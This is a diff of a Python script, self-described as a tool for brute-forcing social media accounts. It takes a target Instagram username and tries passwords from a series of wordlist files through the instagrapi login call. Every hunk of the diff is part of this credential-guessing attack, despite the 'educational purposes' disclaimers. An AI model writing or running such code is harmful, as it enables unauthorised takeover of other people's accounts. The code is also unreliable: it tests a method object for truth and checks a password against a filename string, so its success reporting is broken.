@@ -1,10 +1,10 @@
 """
 Author: @new92
-BruteForcer: Program for Brute Forcing Social Media Accounts
+Brute Forcer: Program for Brute Forcing Social Media Accounts
 Not for illegal purposes !
 The author is not responsible for any illegal activities carried out using this program !!
 User's data (such as: username and/or password) will not be stored or saved !
-The Author's not responsible for any damages may cause the program in the given accounts.
+The author's not responsible for any damages may cause the program in the given accounts.
 """
 #Imports
 try:
@@ -31,7 +31,7 @@ except ImportError as imp:
     time.sleep(2)
 #End of Import
 
-#Message
+#Use
 tkinter.messagebox.showinfo("Use !","This program has been created only for educational purposes! If this program is used for malicious purposes the author has no responsibility !")
 
 #Logo
@@ -60,26 +60,31 @@ while option != "01" and option != "02" and option != "1" and option != "2":
     option=input("[::] Please enter again: ")
 if option == "01" or option == "1":
     user=input("Please enter the username of the account you want to Brute Force: ")
-    username=user.lower().strip()
+    username = user.lower()
+    username = username.strip()
     clnt=instagrapi.Client()
-    f = open("pswrd.txt","r")
-    file = len("pswrd.txt")
+    f = open("pswrd.txt", encoding="utf8")
+    #file = len(f)
     Found = False
-    for i in range(file):
+    L = f.readlines()
+    f.seek(0)
+    LINES = len(L)
+    
+    for j in range(1,LINES + 1):
         try:
-            for j in range(file):
-                    content = f.readline().strip()
-                    ("\n")
-                    password = content
-                    clnt.login(username,password)
+            content = f.readline()
+            content = content.strip()
+            print("\n")
+            password = content
+            clnt.login(username,password)
         except Exception as ex:
             continue
-        if clnt.login == True:
-            print("Password Found: "+str(Found))
-            time.sleep(1)
-            print(password)
-        else:
-            continue
+    if clnt.login == True:
+       print("Password Found: "+str(Found))
+       time.sleep(1)
+       print(password)
+    #else:
+        
     if password not in "pswrd.txt":
         f.close()
         print("Password Found in File 1: "+str(Found))
@@ -87,12 +92,16 @@ if option == "01" or option == "1":
         print("Continuing Brute Force with File 2...")
         time.sleep(2)
         n = open("pswrd1.txt","r")
-        nile = len("pswrd1.txt")
-        for b in range(nile):
+        L = n.readlines()
+        n.seek(0)
+        LINES = len(L)
+        n.seek(0)
+        for b in range(LINES):
             try:
-                for j in range(nile):
-                    content1 = n.readline().strip()
-                    ("\n")
+                for j in range(LINES):
+                    content1 = n.readline()
+                    content1 = content1.strip()
+                    print("\n")
                     password1 = content1
                     clnt.login(username,password1)
             except Exception as ex:
@@ -114,8 +123,9 @@ if option == "01" or option == "1":
         for h in range(cile):
             try:
                 for j in range(cile):
-                    content2 = c.readline().strip()
-                    ("\n")
+                    content2 = c.readline()
+                    content2 = content2.strip()
+                    print("\n")
                     password2 = content2
                     clnt.login(username,password2)
             except Exception as ex:
@@ -137,8 +147,9 @@ if option == "01" or option == "1":
         for h in range(mile):
             try:
                 for j in range(mile):
-                    content3 = m.readline().strip()
-                    ("\n")
+                    content3 = m.readline()
+                    content3 = content3.strip()
+                    print("\n")
                     password3 = content3
                     clnt.login(username,password3)
             except Exception as ex:
@@ -160,8 +171,9 @@ if option == "01" or option == "1":
         for h in range(gile):
             try:
                 for j in range(gile):
-                    content4 = g.readline().strip()
-                    ("\n")
+                    content4 = g.readline()
+                    content4 = content4.strip()
+                    print("\n")
                     password4 = content4
                     clnt.login(username,password4)
             except Exception as ex:
@@ -183,8 +195,9 @@ if option == "01" or option == "1":
         for q in range(zile):
             try:
                 for j in range(zile):
-                    content5 = z.readline().strip()
-                    ("\n")
+                    content5 = z.readline()
+                    content5 = content5.strip()
+                    print("\n")
                     password5 = content5
                     clnt.login(username,password5)
             except Exception as ex:
@@ -206,8 +219,9 @@ if option == "01" or option == "1":
         for q in range(tile):
             try:
                 for j in range(tile):
-                    content6 = t.readline().strip()
-                    ("\n")
+                    content6 = t.readline()
+                    content6 = content6.strip()
+                    print("\n")
                     password6 = content6
                     clnt.login(username,password6)
             except Exception as ex:
@@ -229,8 +243,9 @@ if option == "01" or option == "1":
         for q in range(yile):
             try:
                 for j in range(yile):
-                    content7 = y.readline().strip()
-                    ("\n")
+                    content7 = y.readline()
+                    content7 = content7.strip()
+                    print("\n")
                     password7 = content7
                     clnt.login(username,password7)
             except Exception as ex:
@@ -252,8 +267,9 @@ if option == "01" or option == "1":
         for q in range(pile):
             try:
                 for j in range(pile):
-                    content8 = p.readline().strip()
-                    ("\n")
+                    content8 = p.readline()
+                    content8 = content8.strip()
+                    print("\n")
                     password8 = content8
                     clnt.login(username,password8)
             except Exception as ex:
@@ -275,8 +291,9 @@ if option == "01" or option == "1":
         for q in range(dile):
             try:
                 for j in range(dile):
-                    content9 = d.readline().strip()
-                    ("\n")
+                    content9 = d.readline()
+                    content9 = content9.strip()
+                    print("\n")
                     password9 = content9
                     clnt.login(username,password9)
             except Exception as ex:
